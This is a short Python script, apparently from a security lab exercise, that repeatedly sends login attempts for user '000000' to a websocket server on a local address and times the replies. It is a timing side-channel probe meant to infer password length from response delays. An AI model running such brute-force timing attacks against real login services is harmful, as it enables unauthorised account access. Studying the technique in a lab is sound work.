import socket
import sys
import asyncio
import websockets
import json
import time
import statistics

passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]
test = 0
tijd = 0
number = 0

async def client_stub(username, password):
    server_address = "ws://192.168.1.10:3840"
    err_count = 0
    while True:
        try:
            time_before = time.perf_counter()
            async with websockets.connect(server_address) as websocket:
                await websocket.send(json.dumps([username, password]))
                reply = await websocket.recv()
            time_after = time.perf_counter()
            time_delta = time_after - time_before
            if err_count != 0:
                print(err_count)
                err_count = 0
            return json.loads(reply), time_delta
        except:
            err_count += 1
            continue

def call_server(username, password):
    reply, time_delta = asyncio.get_event_loop().run_until_complete(client_stub(username, password))
    if reply[-15:] == 'Access Granted!':
        print('Correct password found: {}'.format(password))
    time.sleep(0.001)  # Make sure to wait so as to not overload the server!
    return reply, time_delta

for password in passwords:
    while number <= len(passwords):
        info = call_server("000000", password)
        tijd += info[1]
        print("Elapsed total time:", tijd, "seconds")
        number += 1
    print("Total time for password '{}': {}".format(password, tijd))
    tijd = 0
    number = 0









